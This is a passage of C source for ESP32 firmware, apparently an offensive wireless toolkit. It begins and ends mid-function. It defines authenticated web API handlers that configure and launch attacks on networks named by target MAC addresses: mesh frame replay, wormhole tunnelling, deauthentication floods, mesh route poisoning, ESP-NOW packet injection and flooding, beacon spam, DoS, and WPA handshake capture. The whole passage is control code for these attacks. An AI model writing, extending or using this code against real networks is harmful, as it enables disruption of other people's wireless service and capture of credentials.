    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_replay_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_replay_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "frames_captured", 0);
        cJSON_AddNumberToObject(fallback, "frames_replayed", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_replay_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_replay_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

static esp_err_t mesh_wormhole_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[512] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *ja     = cJSON_GetObjectItem(root, "endpoint_a");
    if (!ja) ja = cJSON_GetObjectItem(root, "endpoint_a_mac");
    cJSON *jb     = cJSON_GetObjectItem(root, "endpoint_b");
    if (!jb) jb = cJSON_GetObjectItem(root, "endpoint_b_mac");
    cJSON *jbssid = cJSON_GetObjectItem(root, "parent_bssid");
    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
    cJSON *jchan  = cJSON_GetObjectItem(root, "channel");
    cJSON *jmode  = cJSON_GetObjectItem(root, "mode");
    cJSON *jact   = cJSON_GetObjectItem(root, "action");
    cJSON *jfilt  = cJSON_GetObjectItem(root, "filter");
    cJSON *jssid  = cJSON_GetObjectItem(root, "ssid");
    cJSON *jdelay = cJSON_GetObjectItem(root, "tunnel_delay_ms");

    mesh_wormhole_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsNumber(jchan) || jchan->valueint <= 0) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required");
        return ESP_FAIL;
    }
    cfg.channel = (uint8_t)jchan->valueint;

    if (!cJSON_IsString(ja) || !parse_mac_arg(ja->valuestring, cfg.endpoint_a)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "endpoint_a MAC required");
        return ESP_FAIL;
    }
    if (!cJSON_IsString(jb) || !parse_mac_arg(jb->valuestring, cfg.endpoint_b)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "endpoint_b MAC required");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jbssid) && parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
        cfg.parent_bssid_set = true;
    }

    cfg.mode = cJSON_IsNumber(jmode)
        ? (mesh_wormhole_mode_t)jmode->valueint
        : MESH_WORMHOLE_MODE_BIDIR;
    if (cfg.mode >= MESH_WORMHOLE_MODE_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
        return ESP_FAIL;
    }

    cfg.action = cJSON_IsNumber(jact)
        ? (mesh_wormhole_action_t)jact->valueint
        : MESH_WORMHOLE_ACTION_RELAY;
    if (cfg.action >= MESH_WORMHOLE_ACTION_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid action");
        return ESP_FAIL;
    }

    cfg.filter = cJSON_IsNumber(jfilt)
        ? (mesh_wormhole_filter_t)jfilt->valueint
        : MESH_WORMHOLE_FILTER_ALL;
    if (cfg.filter >= MESH_WORMHOLE_FILTER_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid filter");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }
    if (cJSON_IsNumber(jdelay) && jdelay->valueint >= 0) {
        cfg.tunnel_delay_ms = (uint16_t)jdelay->valueint;
    }

    ESP_LOGW(TAG, "MESH Wormhole: ch=%u mode=%d action=%d filter=%d",
             cfg.channel, (int)cfg.mode, (int)cfg.action, (int)cfg.filter);

    esp_err_t ret = mesh_wormhole_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_wormhole_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_wormhole_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "frames_captured", 0);
        cJSON_AddNumberToObject(fallback, "frames_tunneled", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_wormhole_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_wormhole_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH L2 DEAUTH HANDLERS                                            */
/* ================================================================== */

static esp_err_t mesh_l2_deauth_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[768] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jmode   = cJSON_GetObjectItem(root, "mode");
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_size");
    cJSON *jreason = cJSON_GetObjectItem(root, "reason_code");
    cJSON *jextra  = cJSON_GetObjectItem(root, "extra_targets");

    mesh_l2_deauth_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
        ESP_LOGW(TAG, "MESH L2 Deauth: Invalid parent_bssid='%s' (need MAC, not IP)",
                 cJSON_IsString(jbssid) ? jbssid->valuestring : "(missing)");
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "Invalid parent_bssid (need MAC AA:BB:CC:DD:EE:FF, not IP)");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
        cfg.target_mac_set = true;
    } else {
        memset(cfg.target_mac, 0xFF, 6);
    }

    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
    cfg.mode = cJSON_IsNumber(jmode)
        ? (mesh_l2_deauth_mode_t)jmode->valueint
        : MESH_L2_DEAUTH_MODE_TARGETED;
    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 50;
    cfg.burst_size  = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 5;
    cfg.reason_code = cJSON_IsNumber(jreason) ? (uint16_t)jreason->valueint : 7;

    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }

    if (cJSON_IsArray(jextra)) {
        int n = cJSON_GetArraySize(jextra);
        for (int i = 0; i < n && cfg.extra_target_count < MESH_L2_DEAUTH_MAX_TARGETS; i++) {
            cJSON *item = cJSON_GetArrayItem(jextra, i);
            if (cJSON_IsString(item) &&
                parse_mac_arg(item->valuestring, cfg.extra_targets[cfg.extra_target_count])) {
                cfg.extra_target_count++;
            }
        }
    }

    if (cfg.mode <= MESH_L2_DEAUTH_MODE_NONE || cfg.mode >= MESH_L2_DEAUTH_MODE_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
        return ESP_FAIL;
    }

    ESP_LOGW(TAG, "MESH L2 Deauth: bssid=%s mode=%d burst=%u interval=%u",
             jbssid->valuestring, (int)cfg.mode, cfg.burst_size, cfg.interval_ms);

    esp_err_t ret = mesh_l2_deauth_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_l2_deauth_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_l2_deauth_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_l2_deauth_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_l2_deauth_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  MESH ROUTE POISON HANDLERS                                         */
/* ================================================================== */

static esp_err_t mesh_route_poison_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[768] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jhopmac = cJSON_GetObjectItem(root, "fake_next_hop");
    if (!jhopmac) jhopmac = cJSON_GetObjectItem(root, "next_hop");
    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
    cJSON *jmode   = cJSON_GetObjectItem(root, "mode");
    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_size");
    cJSON *jhop    = cJSON_GetObjectItem(root, "hop_count");
    cJSON *jcost   = cJSON_GetObjectItem(root, "path_cost");

    mesh_route_poison_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));

    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
        ESP_LOGW(TAG, "MESH Route Poison: Invalid parent_bssid='%s' (need MAC, not IP)",
                 cJSON_IsString(jbssid) ? jbssid->valuestring : "(missing)");
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "Invalid parent_bssid (need MAC AA:BB:CC:DD:EE:FF, not IP)");
        return ESP_FAIL;
    }

    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
        cfg.target_mac_set = true;
    } else {
        memset(cfg.target_mac, 0xFF, 6);
    }

    if (cJSON_IsString(jhopmac) && parse_mac_arg(jhopmac->valuestring, cfg.fake_next_hop)) {
        cfg.fake_next_hop_set = true;
    }

    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
    cfg.mode = cJSON_IsNumber(jmode)
        ? (mesh_route_poison_mode_t)jmode->valueint
        : MESH_ROUTE_POISON_MODE_ROUTE_ADV;
    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 50;
    cfg.burst_size  = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 5;
    cfg.hop_count   = cJSON_IsNumber(jhop) ? (uint8_t)jhop->valueint : 1;
    cfg.path_cost   = cJSON_IsNumber(jcost) ? (uint16_t)jcost->valueint : 0;

    if (cJSON_IsString(jssid)) {
        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
    }

    if (cfg.mode <= MESH_ROUTE_POISON_MODE_NONE || cfg.mode >= MESH_ROUTE_POISON_MODE_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
        return ESP_FAIL;
    }

    ESP_LOGW(TAG, "MESH Route Poison: bssid=%s mode=%d hop=%u cost=%u burst=%u",
             jbssid->valuestring, (int)cfg.mode, cfg.hop_count, cfg.path_cost, cfg.burst_size);

    esp_err_t ret = mesh_route_poison_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    return send_json_response(req, resp);
}

static esp_err_t mesh_route_poison_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = mesh_route_poison_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t mesh_route_poison_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    mesh_route_poison_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}

/* ================================================================== */
/*  ESP-NOW ATTACK HANDLERS                                            */
/* ================================================================== */

static esp_err_t espnow_start_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char buf[768] = {0};
    size_t total = 0;
    int remaining = req->content_len;
    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
        return ESP_FAIL;
    }
    while (remaining > 0) {
        int len = httpd_req_recv(req, buf + total, remaining);
        if (len <= 0) {
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
            return ESP_FAIL;
        }
        total += (size_t)len;
        remaining -= len;
    }
    buf[total] = '\0';

    cJSON *root = cJSON_Parse(buf);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *jchan     = cJSON_GetObjectItem(root, "channel");
    cJSON *jmode     = cJSON_GetObjectItem(root, "mode");
    cJSON *jtarget   = cJSON_GetObjectItem(root, "target_mac");
    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
    cJSON *jbc       = cJSON_GetObjectItem(root, "broadcast");
    cJSON *jframe    = cJSON_GetObjectItem(root, "frame_index");
    cJSON *jpayload  = cJSON_GetObjectItem(root, "payload_hex");
    cJSON *jburst    = cJSON_GetObjectItem(root, "burst_count");
    if (!jburst) jburst = cJSON_GetObjectItem(root, "burst_size");
    cJSON *jintv     = cJSON_GetObjectItem(root, "interval_ms");
    cJSON *jtimeout  = cJSON_GetObjectItem(root, "timeout_sec");

    espnow_attack_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.frame_index = -1;

    if (!cJSON_IsNumber(jchan) || jchan->valueint < 1 || jchan->valueint > 13) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required (1-13)");
        return ESP_FAIL;
    }
    cfg.channel = (uint8_t)jchan->valueint;

    cfg.mode = cJSON_IsNumber(jmode)
        ? (espnow_attack_mode_t)jmode->valueint
        : ESPNOW_MODE_MONITOR;
    if (cfg.mode >= ESPNOW_MODE_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
        return ESP_FAIL;
    }

    if (cJSON_IsBool(jbc) && cJSON_IsTrue(jbc)) {
        cfg.broadcast = true;
    }
    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
        cfg.target_mac_set = true;
    }
    if (cJSON_IsNumber(jframe)) {
        cfg.frame_index = (int16_t)jframe->valueint;
    }
    if (cJSON_IsNumber(jburst) && jburst->valueint > 0) {
        cfg.burst_count = (uint16_t)jburst->valueint;
    } else {
        cfg.burst_count = 1;
    }
    if (cJSON_IsNumber(jintv) && jintv->valueint > 0) {
        cfg.interval_ms = (uint16_t)jintv->valueint;
    } else {
        cfg.interval_ms = 50;
    }
    if (cJSON_IsNumber(jtimeout) && jtimeout->valueint > 0) {
        cfg.timeout_sec = (uint16_t)jtimeout->valueint;
    }

    if (cJSON_IsString(jpayload) && jpayload->valuestring[0]) {
        if (!espnow_attack_parse_hex_payload(jpayload->valuestring,
                                             cfg.payload, &cfg.payload_len)) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                                "Invalid payload_hex (even hex, max 250 bytes)");
            return ESP_FAIL;
        }
    }

    if ((cfg.mode == ESPNOW_MODE_INJECT ||
         (cfg.mode == ESPNOW_MODE_FLOOD && cfg.payload_len > 0)) &&
        cfg.payload_len == 0) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "payload_hex required for inject/flood");
        return ESP_FAIL;
    }

    ESP_LOGW(TAG, "ESP-NOW: ch=%u mode=%d burst=%u interval=%u payload=%u",
             cfg.channel, (int)cfg.mode, cfg.burst_count, cfg.interval_ms,
             cfg.payload_len);

    esp_err_t ret = espnow_attack_start(&cfg);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
    if (ret == ESP_ERR_INVALID_STATE) {
        cJSON_AddStringToObject(resp, "error", "Radio busy or already running");
    }
    return send_json_response(req, resp);
}

static esp_err_t espnow_status_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = espnow_attack_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "active", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "frames_captured", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t espnow_stop_handler(httpd_req_t *req)
{
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    espnow_attack_stop();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", true);
    cJSON_AddStringToObject(resp, "status", "stopped");
    return send_json_response(req, resp);
}


/* ================================================================== */
/*  WiFi ATTACK HANDLERS                                               */
/* ================================================================== */

static esp_err_t attack_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
    cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
    cJSON *minutes_json = cJSON_GetObjectItem(root, "minutes");
    
    if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json) ||
        channel_json->valueint <= 0 || channel_json->valueint > 14) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing bssid or channel");
        return ESP_FAIL;
    }
    
    uint8_t bssid[6];
    if (!parse_bssid(bssid_json->valuestring, bssid)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid bssid");
        return ESP_FAIL;
    }
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(bssid));
    
    start_deauth_attack(bssid_str, channel_json->valueint);
    
    if (cJSON_IsNumber(minutes_json) && minutes_json->valueint > 0) {
        attack_duration_minutes = minutes_json->valueint <= 999 ? minutes_json->valueint : 999;
        attack_start_time = time(NULL);
        attack_timer_active = true;
        if (attack_timer_handle == NULL) {
            xTaskCreate(attack_timer_task, "attack_timer", 2048, NULL, 5, &attack_timer_handle);
        }
    }
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t beacon_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[100];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
    cJSON *count_json = cJSON_GetObjectItem(root, "count");
    
    int mode = mode_json ? mode_json->valueint : 0;
    int count = count_json ? count_json->valueint : 50;
    
    attack_beacon_spam_start(count, mode);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t beacon_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_beacon_spam_stop();
    return send_success_response(req);
}

static esp_err_t beacon_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_beacon_spam_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "mode_str", "Idle");
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "ap_count", 0);
        cJSON_AddNumberToObject(fallback, "packet_count", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t dos_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
    if (!fill_ap_record_from_json(root, &dos_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &dos_target;
    int dos_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_DOS_METHOD_BROADCAST;
    if (dos_method <= ATTACK_DOS_METHOD_NONE || dos_method >= ATTACK_DOS_METHOD_COUNT) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }
    attack_config.method = dos_method;
    
    ESP_LOGI(TAG, "Starting DoS attack with method: %d", attack_config.method);
    attack_dos_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t dos_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping DoS attack");
    attack_dos_stop();
    return send_success_response(req);
}

static esp_err_t dos_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_dos_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "method_str", "Idle");
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "packet_count", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

/* ── Handshake Capture Handlers ──────────────────────────────────── */

static esp_err_t handshake_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
    if (!fill_ap_record_from_json(root, &handshake_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &handshake_target;
    int handshake_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_HANDSHAKE_METHOD_BROADCAST;
    if (handshake_method < ATTACK_HANDSHAKE_METHOD_ROGUE_AP || handshake_method > ATTACK_HANDSHAKE_METHOD_PASSIVE) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
        return ESP_FAIL;
    }
    attack_config.method = handshake_method;
    
    ESP_LOGI(TAG, "Starting Handshake capture with method: %d", attack_config.method);
    attack_handshake_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t handshake_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
